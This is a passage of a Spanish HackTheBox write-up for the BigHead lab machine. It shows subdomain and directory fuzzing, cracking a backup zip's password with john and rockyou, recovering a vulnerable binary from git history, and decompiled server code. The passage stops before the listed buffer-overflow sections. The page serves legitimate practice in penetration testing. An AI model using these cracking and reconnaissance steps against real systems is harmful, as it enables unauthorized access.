@@ -1,0 +1,1595 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox BigHead</title>
+
+  <meta name="description" content="Resolución de la máquina BigHead de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox BigHead">
+  <meta name="twitter:description" content="Resolución de la máquina BigHead de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/bighead.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox BigHead">
+  <meta property="og:description" content="Resolución de la máquina BigHead de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/bighead.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/bighead.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox BigHead" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-nelson">Shell - nelson</a></li>
+        <li><a href="#bof-egghunter">BOF - egghunter</a></li>
+        <li><a href="#bof-loadlibrary">BOF - loadlibrary</a></li>
+        <li><a href="#shell-nginx">Shell - nginx</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/bighead.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">BigHead</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo un puerto abierto, este es el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.112
+Nmap scan report for 10.10.10.112  
+PORT   STATE SERVICE
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque es innecesario por ahora, solo por comodidad agregaremos el dominio <code class="language-plaintext highlighter-rouge">bighead.htb</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que asi sepa a donde debe resolver</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.112 bighead.htb" </span><span class="p">| </span><span class="ve">sudo tee </span><span class="p">-a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos el servicio <code class="language-plaintext highlighter-rouge">http</code> desde el navegador nos encontramos una página web un poco simple que de primeras realmente no nos lleva a nada demasiado interesante</p>
+<a href="/htb/bighead/1.png" target="_blank"><div><p><img src="/htb/bighead/1.png"></p></div></a>
+
+<p class="plain-text">Mirando el codigo fuente encontramos que en el codigo del <code class="language-plaintext highlighter-rouge">formulario</code> este intenta enviar los datos mediante el metodo <code class="language-plaintext highlighter-rouge">POST</code> hacia el subdominio <code class="language-plaintext highlighter-rouge">mailer</code></p>
+<a href="/htb/bighead/2.png" target="_blank"><div><p><img src="/htb/bighead/2.png"></p></div></a>
+
+<p class="plain-text">Antes de ver su contenido podemos intentar fuzzear por mas <code class="language-plaintext highlighter-rouge">subdominios</code>, usando <code class="language-plaintext highlighter-rouge">wfuzz</code> y un diccionario de seclists encontramos 2 mas que son <code class="language-plaintext highlighter-rouge">dev</code> y <code class="language-plaintext highlighter-rouge">code</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H </span><span class="am">"Host: FUZZ.bighead.htb"</span><span class="p"> -u http://bighead.htb -t 100 --hh 11175  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://bighead.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000019:   </span><span class="ve">200</span><span class="p">        1 L      3 W        13456 Ch    "dev"
+000000224:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "mailer"
+000000573:   </span><span class="az">302</span><span class="p">        0 L      0 W        0 Ch        "code"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de agregar los <code class="language-plaintext highlighter-rouge">3</code> subdominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y ver su contenido principal podemos decir que no nos lleva a ningun lado, <code class="language-plaintext highlighter-rouge">dev</code> solo nos muestra una imagen</p>
+<a href="/htb/bighead/3.png" target="_blank"><div><p><img src="/htb/bighead/3.png"></p></div></a>
+
+<p class="plain-text">Ahora usamos <code class="language-plaintext highlighter-rouge">wfuzz</code> para intentar descubrir directorios bajo el subdominio <code class="language-plaintext highlighter-rouge">dev</code>, algunos que inician con blog devuelven <code class="language-plaintext highlighter-rouge">302</code> pero coffee nos devuelve un <code class="language-plaintext highlighter-rouge">418</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://dev.bighead.htb/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://dev.bighead.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000013:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "wp-content"
+000000050:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blog"
+000000335:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blogs"
+000002714:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blog2"
+000003634:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blog1"
+000004250:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "wp-contents"
+000007409:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blog3"
+000008049:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blogapi"
+000008945:   </span><span class="ro">418</span><span class="p">        1 L      3 W        46 Ch       "coffee"
+000010016:   </span><span class="az">302</span><span class="p">        7 L      10 W       161 Ch      "blogging"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si accedemos al directorio <code class="language-plaintext highlighter-rouge">/coffee</code> descubierto simplemente se nos muestra un gif de google mostrando el codigo de estado <code class="language-plaintext highlighter-rouge">418</code> tambien llamado <code class="language-plaintext highlighter-rouge">I'm a teapot</code></p>
+<a href="/htb/bighead/4.png" target="_blank"><div><p><img src="/htb/bighead/4.png"></p></div></a>
+
+<p class="plain-text">Algo interesante son las cabeceras de respuesta, si hacemos un simple <code class="language-plaintext highlighter-rouge">curl</code> con el parametro <code class="language-plaintext highlighter-rouge">-I</code> para verlas nos dice que esta corriendo <code class="language-plaintext highlighter-rouge">BigheadWebSvr 1.0</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">http://dev.bighead.htb/coffee -I  
+HTTP/1.1 200 OK
+Date: Tue, 24 Oct 2023 20:12:40 GMT
+Content-Type: text/html
+Content-Length: 13456
+Connection: keep-alive
+Server: BigheadWebSvr 1.0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si buscamos esa tecnologia por internet nos lleva a un <a href="https://github.com/3mrgnc3/BigheadWebSvr">repositorio</a> de github con un zip</p>
+<a href="/htb/bighead/8.png" target="_blank"><div><p><img src="/htb/bighead/8.png"></p></div></a>
+
+<p class="plain-text">Despues de clonar el repo nos queda un zip con lo que parece ser un <code class="language-plaintext highlighter-rouge">backup</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l 
+.rw-r--r-- kali kali 8.7 KB Tue Oct 24 20:12:59 2023  BHWS_Backup.zip  
+.rw-r--r-- kali kali  34 KB Tue Oct 24 20:12:59 2023  LICENSE
+.rw-r--r-- kali kali  39 B  Tue Oct 24 20:12:59 2023  README.md</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al intentar descomprimirlo nos pide una contraseña que no conocemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ 7z</span><span class="p"> x BHWS_Backup.zip
+
+Scanning the drive for archives:
+1 file, 8894 bytes (9 KiB)
+
+Extracting archive: BHWS_Backup.zip
+--
+Path = BHWS_Backup.zip
+Type = zip
+Physical Size = 8894
+
+Enter password (will not be echoed):  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">zip2john</code> para crear un hash de la contraseña del zip para posteriormente crackearla con <code class="language-plaintext highlighter-rouge">john</code> a traves de solo fuerza bruta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ zip2john </span><span class="p">BHWS_Backup.zip > hash
+
+</span><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 10 password hashes with 10 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 XOP 4x2])  
+Loaded hashes with cost 1 (HMAC size) varying from 73 to 1356
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">thepiedpiper89</span><span class="p">   (</span><span class="am">BHWS_Backup.zip</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora descomprimimos el <code class="language-plaintext highlighter-rouge">zip</code> pasandole la contraseña, el comprimido nos deja varios archivos, un <code class="language-plaintext highlighter-rouge">.txt</code> y varios archivos de configuracion dentro de una carpeta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ 7z </span><span class="p">x BHWS_Backup.zip
+
+Scanning the drive for archives:
+1 file, 8894 bytes (9 KiB)
+
+Extracting archive: BHWS_Backup.zip
+--
+Path = BHWS_Backup.zip
+Type = zip
+Physical Size = 8894
+
+Enter password (will not be echoed): thepiedpiper89  
+Everything is Ok
+
+Folders: 2
+Files: 10
+Size:       22340
+Compressed: 8894</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tree</span><span class="p">
+.
+├── BigheadWebSvr_exe_NOTICE.txt  
+└── conf
+    ├── fastcgi.conf
+    ├── fastcgi_params
+    ├── koi-utf
+    ├── koi-win
+    ├── mime.types
+    ├── nginx.conf
+    ├── scgi_params
+    ├── uwsgi_params
+    └── win-utf
+
+2 directories, 10 files</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si leemos el <code class="language-plaintext highlighter-rouge">.txt</code> nos dice que el software vulnerable ha sido removido del archivo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">BigheadWebSvr_exe_NOTICE.txt
+I removed this vulnerable crapware from the archive  
+
+love
+Gilfoyle... :D</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto podria ser un problema pero es facil de resolver ya que aunque se elimino el archivo del zip podemos volver a un <code class="language-plaintext highlighter-rouge">commit</code> anterior donde este aun existia</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ git </span><span class="p">log --oneline
+</span><span class="am">5cc2d98 (</span><span class="az">HEAD -> </span><span class="ve">master</span><span class="am">, </span><span class="ro">origin/master</span><span class="am">, </span><span class="ro">origin/HEAD</span><span class="am">) </span><span class="p">Add files via upload  
+</span><span class="am">c25f61e </span><span class="p">Fixed a bug
+</span><span class="am">b1b4d6e </span><span class="p">Nelson's Web Server Backup
+</span><span class="am">54182c6 </span><span class="p">Initial commit
+
+</span><span class="ve">❯ git </span><span class="p">checkout b1b4d6e
+Nota: cambiando a 'b1b4d6e'.
+HEAD está ahora en b1b4d6e Nelson's Web Server Backup</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque la contraseña del <code class="language-plaintext highlighter-rouge">zip</code> es diferente en este commit podemos repetir el proceso de antes para conseguirla y asi descomprimir el zip que esta cifrado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ zip2john </span><span class="p">BHWS_Backup.zip > hash
+
+</span><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 11 password hashes with 11 different salts (ZIP, WinZip [PBKDF2-SHA1 128/128 XOP 4x2])  
+Loaded hashes with cost 1 (HMAC size) varying from 257 to 23430
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">bighead</span><span class="p">          (</span><span class="am">BHWS_Backup.zip</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ 7z </span><span class="p">x BHWS_Backup.zip
+Scanning the drive for archives:
+1 file, 42198 bytes (42 KiB)
+
+Extracting archive: BHWS_Backup.zip
+--
+Path = BHWS_Backup.zip
+Type = zip
+Physical Size = 42198
+
+Enter password (will not be echoed): bighead  
+Everything is Ok
+
+Folders: 2
+Files: 11
+Size:       102236
+Compressed: 42198</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ahora miramos la carpeta que nos deja vemos 2 archivos nuevos, un <code class="language-plaintext highlighter-rouge">exe</code> y un <code class="language-plaintext highlighter-rouge">dll</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tree</span><span class="p">
+.
+├── bHeadSvr.dll
+├── BigheadWebSvr.exe
+└── conf
+    ├── fastcgi.conf
+    ├── fastcgi_params  
+    ├── koi-utf
+    ├── koi-win
+    ├── mime.types
+    ├── nginx.conf
+    ├── scgi_params
+    ├── uwsgi_params
+    └── win-utf</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-nelson">
+<br><h3 class="post-title">Shell - nelson</h3><br>
+
+<p class="plain-text">Iniciemos analizando el binario, para ello podemos usar un decompilador como <code class="language-plaintext highlighter-rouge">ida</code> y asi ver su codigo, al decompilarlo nos podemos encontrar la funcion <code class="language-plaintext highlighter-rouge">main</code> que se encarga de abrir el servidor en el puerto <code class="language-plaintext highlighter-rouge">8008</code> y llama a <code class="language-plaintext highlighter-rouge">ConnectionHanlder</code></p>
+<a href="/htb/bighead/30.png" target="_blank"><div><p><img src="/htb/bighead/30.png"></p></div></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)
+{
+  </span><span class="no">int </span><span class="p">Error; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">bind_error; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">listen_error; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">accept_error; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">client_ip; </span><span class="c1">// ebx
+  </span><span class="no">char </span><span class="o">*</span><span class="p">client_port; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">addrlen; </span><span class="c1">// [esp+0h] [ebp-250h] BYREF
+  </span><span class="no">struct </span><span class="p">sockaddr addr; </span><span class="c1">// [esp+4h] [ebp-24Ch] BYREF
+  </span><span class="p">ADDRINFOA addrinfo_hints; </span><span class="c1">// [esp+14h] [ebp-23Ch] BYREF
+  </span><span class="p">PADDRINFOA addrinfo_result; </span><span class="c1">// [esp+34h] [ebp-21Ch] BYREF
+  </span><span class="no">struct </span><span class="p">WSAData WSAData; </span><span class="c1">// [esp+38h] [ebp-218h] BYREF
+  </span><span class="no">char </span><span class="p">usage[</span><span class="mi">94</span><span class="p">]; </span><span class="c1">// [esp+1C8h] [ebp-88h] BYREF
+  </span><span class="no">char </span><span class="p">port[</span><span class="mi">6</span><span class="p">]; </span><span class="c1">// [esp+226h] [ebp-2Ah] BYREF
+  </span><span class="no">int </span><span class="p">wsastartup_error; </span><span class="c1">// [esp+22Ch] [ebp-24h]
+  </span><span class="no">LPVOID </span><span class="p">lpParameter; </span><span class="c1">// [esp+230h] [ebp-20h]
+  </span><span class="p">SOCKET server_socket; // [esp+234h] [ebp-1Ch]
+  </span><span class="no">int </span><span class="o">*</span><span class="p">p_argc; </span><span class="c1">// [esp+240h] [ebp-10h]
+
+  </span><span class="p">p_argc </span><span class="o">= &</span><span class="p">argc;
+  __main();
+  </span><span class="no">strcpy</span><span class="p">(usage, </span><span class="s">"Usage: </span><span class="mi">%s </span><span class="s">[port_number]</span><span class="mi">\n\n</span><span class="s">If no port number is provided, the default port of </span><span class="mi">%s </span><span class="s">will be used.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
+  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o">> </span><span class="mi">2</span><span class="p"> )
+    </span><span class="o">goto </span><span class="p">LABEL_2;
+  </span><span class="o">if </span><span class="p">( argc </span><span class="o">== </span><span class="mi">2</span><span class="p"> )
+  {
+    </span><span class="o">if</span><span class="p"> ( </span><span class="no">atoi</span><span class="p">(argv[</span><span class="mi">1</span><span class="p">]) </span><span class="o"><= </span><span class="mi">0</span><span class="o"> || </span><span class="no">atoi</span><span class="p">(argv[</span><span class="mi">1</span><span class="p">]) </span><span class="o">> </span><span class="mi">0xFFFF</span><span class="o"> || </span><span class="no">strlen</span><span class="p">(argv[</span><span class="mi">1</span><span class="p">]) </span><span class="o">> </span><span class="mi">6</span><span class="p"> )
+    {
+</span><span class="na">LABEL_2</span><span class="p">:
+      </span><span class="no">printf</span><span class="p">(usage, </span><span class="o">*</span><span class="p">argv, </span><span class="s">"8008"</span><span class="p">);
+      </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+    }
+    </span><span class="no">strncpy</span><span class="p">(port, argv[</span><span class="mi">1</span><span class="p">], </span><span class="mi">6</span><span class="no">u</span><span class="p">);
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    </span><span class="no">strncpy</span><span class="p">(port, </span><span class="s">"8008"</span><span class="p">, </span><span class="mi">6</span><span class="no">u</span><span class="p">);
+  }
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Starting BigheadWebSvr version </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">, </span><span class="s">"1.0"</span><span class="p">);
+  EssentialFunc1();
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"</span><span class="mi">\n</span><span class="s">This is vulnerable software!\nDo not allow access from untrusted systems or networks!</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
+  server_socket </span><span class="o">= -</span><span class="mi">1</span><span class="p">;
+  lpParameter </span><span class="o">=</span><span class="p"> (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;
+  addrinfo_result </span><span class="o">= </span><span class="mi">0</span><span class="p">;
+  addrlen </span><span class="o">= </span><span class="mi">16</span><span class="p">;
+  wsastartup_error </span><span class="o">= </span><span class="p">WSAStartup(</span><span class="mi">0x202</span><span class="no">u</span><span class="p">, </span><span class="o">&</span><span class="p">WSAData);
+  </span><span class="o">if</span><span class="p"> ( wsastartup_error )
+  {
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"WSAStartup failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, wsastartup_error);
+    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">addrinfo_hints, </span><span class="mi">0</span><span class="p">, </span><span class="no">sizeof</span><span class="p">(addrinfo_hints));
+    addrinfo_hints.ai_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
+    addrinfo_hints.ai_socktype </span><span class="o">= </span><span class="mi">1</span><span class="p">;
+    addrinfo_hints.ai_protocol </span><span class="o">= </span><span class="mi">6</span><span class="p">;
+    addrinfo_hints.ai_flags </span><span class="o">= </span><span class="mi">1</span><span class="p">;
+    wsastartup_error </span><span class="o">= </span><span class="p">getaddrinfo(</span><span class="mi">0</span><span class="p">, port, </span><span class="o">&</span><span class="p">addrinfo_hints, </span><span class="o">&</span><span class="p">addrinfo_result);
+    </span><span class="o">if </span><span class="p">( wsastartup_error )
+    {
+      </span><span class="no">printf</span><span class="p">(</span><span class="s">"Getaddrinfo failed with error:</span><span class="mi"> %d\n</span><span class="s">"</span><span class="p">, wsastartup_error);
+      WSACleanup();
+      </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+    }
+    </span><span class="o">else</span><span class="p">
+    {
+      server_socket </span><span class="o">= </span><span class="p">socket(addrinfo_result->ai_family, addrinfo_result->ai_socktype, addrinfo_result->ai_protocol);  
+      </span><span class="o">if</span><span class="p"> ( server_socket </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
+      {
+        Error </span><span class="o">= </span><span class="p">WSAGetLastError();
+        </span><span class="no">printf</span><span class="p">(</span><span class="s">"Socket failed with error: </span><span class="mi">%ld\n</span><span class="s">"</span><span class="p">, Error);
+        freeaddrinfo(addrinfo_result);
+        WSACleanup();
+        </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+      }
+      </span><span class="o">else</span><span class="p">
+      {
+        wsastartup_error </span><span class="o">= </span><span class="p">bind(server_socket, addrinfo_result->ai_addr, addrinfo_result->ai_addrlen);
+        </span><span class="o">if</span><span class="p"> ( wsastartup_error </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
+        {
+          bind_error </span><span class="o">= </span><span class="p">WSAGetLastError();
+          </span><span class="no">printf</span><span class="p">(</span><span class="s">"Bind failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, bind_error);
+          closesocket(server_socket);
+          WSACleanup();
+          </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+        }
+        </span><span class="o">else</span><span class="p">
+        {
+          freeaddrinfo(addrinfo_result);
+          wsastartup_error </span><span class="o">= </span><span class="p">listen(server_socket, </span><span class="mi">0x7FFFFFFF</span><span class="p">);
+          </span><span class="o">if</span><span class="p"> ( wsastartup_error </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
+          {
+            listen_error </span><span class="o">= </span><span class="p">WSAGetLastError();
+            </span><span class="no">printf</span><span class="p">(</span><span class="s">"Listen failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, listen_error);
+            closesocket(server_socket);
+            WSACleanup();
+            </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+          }
+          </span><span class="o">else</span><span class="p">
+          {
+            </span><span class="o">while</span><span class="p"> ( server_socket )
+            {
+              </span><span class="no">puts</span><span class="p">(</span><span class="s">"Waiting for client connections..."</span><span class="p">);
+              lpParameter </span><span class="o">= </span><span class="p">(</span><span class="na">LPVOID</span><span class="p">)accept(server_socket, </span><span class="o">&</span><span class="p">addr, </span><span class="o">&</span><span class="p">addrlen);
+              </span><span class="o">if </span><span class="p">( lpParameter </span><span class="o">== </span><span class="p">(</span><span class="na">LPVOID</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p"> )
+              {
+                accept_error </span><span class="o">= </span><span class="p">WSAGetLastError();
+                </span><span class="no">printf</span><span class="p">(</span><span class="s">"Accept failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, accept_error);
+                closesocket(server_socket);
+                WSACleanup();
+                </span><span class="o">return </span><span class="mi">1</span><span class="p">;
+              }
+              client_ip </span><span class="o">= </span><span class="p">htons(</span><span class="o">*</span><span class="p">(</span><span class="na">u_short </span><span class="o">*</span><span class="p">)addr.sa_data);
+              client_port </span><span class="o">= </span><span class="p">inet_ntoa(</span><span class="o">*</span><span class="p">(</span><span class="no">struct </span><span class="p">in_addr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">addr.sa_data[</span><span class="mi">2</span><span class="p">]);
+              </span><span class="no">printf</span><span class="p">(</span><span class="s">"Received a client connection from </span><span class="mi">%s</span><span class="s">:</span><span class="mi">%u\n</span><span class="s">"</span><span class="p">, client_port, client_ip);
+              CreateThread(</span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">, (LPTHREAD_START_ROUTINE)ConnectionHandler, lpParameter, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">);
+            }
+            closesocket(</span><span class="mi">0</span><span class="p">);
+            WSACleanup();
+            </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+          }
+        }
+      }
+    }
+  }
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer clic en <code class="language-plaintext highlighter-rouge">ConnectionHandler</code> nos lleva a una función sin nombre que resumiendola se encarga de gestionar las peticiones <code class="language-plaintext highlighter-rouge">http</code> hechas al servidor, en caso de que la petición sea <code class="language-plaintext highlighter-rouge">HEAD</code> llama a <code class="language-plaintext highlighter-rouge">Function4</code> pasandole como argumento la ruta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="p"> __stdcall </span><span class="na">ConnectionHandler</span><span class="p">(</span><span class="na">LPVOID </span><span class="am">lpThreadParameter</span><span class="p">)
+{
+  </span><span class="no">int </span><span class="p">result; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">send_error; </span><span class="c1">// eax
+  </span><span class="no">int </span><span class="p">Error; // eax
+  </span><span class="no">int </span><span class="p">recv_error; </span><span class="c1">// eax
